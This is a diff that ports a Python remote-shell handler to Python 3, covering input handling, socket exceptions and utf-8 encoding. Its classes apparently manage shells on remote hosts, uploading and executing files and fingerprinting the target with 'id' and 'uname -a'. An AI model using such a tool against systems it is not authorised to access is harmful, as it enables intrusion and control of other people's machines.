@@ -113,7 +113,7 @@ def main():
 def prompt(message):
     answer = ""
     while(answer != "Y" and answer != "N"):
-        answer = raw_input(message + " (Y/N): ")
+        answer = input(message + " (Y/N): ")
         answer = answer.upper()
     return answer == "Y"
 
@@ -143,7 +143,7 @@ class Socket:
         except socket.timeout:
             print("[!] Error: Connection timed out")
             self.close()
-        except socket.error, err:
+        except socket.error as err:
             print("[!] Error: Connection lost")
             print(err)
             self.close()
@@ -173,7 +173,7 @@ class Socket:
         except socket.timeout:
             print("[!] Error: Connection timed out")
             self.close()
-        except socket.error, err:
+        except socket.error as err:
             print("[!] Error: Connection lost")
             print(err)
             self.close()
@@ -186,7 +186,7 @@ class Socket:
     # @return void
     def send(self, message, chunksize = 2048):
         for chunk in self._chunks(message, chunksize):
-            self.conn.send(chunk)
+            self.conn.send(chunk.encode("utf-8"))
         time.sleep(0.1)
 
     # Receive a socket string
@@ -204,13 +204,13 @@ class Socket:
         try:
             while True:
                 data = self.conn.recv(chunksize)
-                output += data
-                if print_output == True: sys.stdout.write(str(data))
+                output += data.decode("utf-8")
+                if print_output == True: sys.stdout.write(str(data.decode("utf-8")))
                 if not data: break
         except socket.timeout:
             print("[!] Error: Connection timed out")
             self.close()
-        except socket.error, e:
+        except socket.error as e:
             err = e.args[0]
             if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                 return output
@@ -225,13 +225,13 @@ class Socket:
         try:
             self.sock.close()
             if exit: sys.exit()
-        except socket.error, e:
+        except socket.error as e:
             print("[!] Error: " + str(e))
 
     # Helper function to break a string into x chunks
     # @return list
     def _chunks(self, lst, chunksize):
-        for i in xrange(0, len(lst), chunksize):
+        for i in range(0, len(lst), chunksize):
             yield lst[i:i+chunksize]
 
 
@@ -311,9 +311,9 @@ class Shell:
         # Fetch command
         try:
             if (self._has_prompt()):
-                command = raw_input("")
+                command = input("")
             else:
-                command = raw_input(self._get_prompt())
+                command = input(self._get_prompt())
 
             # Check if the command is a RSH command
             if command.startswith("rsh"):
@@ -666,7 +666,7 @@ class RSH:
             file.close()
             print("[+] Successfully downloaded file to %s!" % localfile)
             return localfile
-        except Exception, err:
+        except Exception as err:
             print("[!] Error: %s" % err)
 
     # Upload and execute a local file to the remote shell
@@ -726,7 +726,7 @@ class RSH:
     def fingerprint(self):
         self.sock.send("id\n")
         print("[+] ID level: %s" % self.sock.receive())
-        self.sock.send("which\n")
+        self.sock.send("uname -a\n")
         print("[+] Operating system: %s" % self.sock.receive())
 
 # Call main 
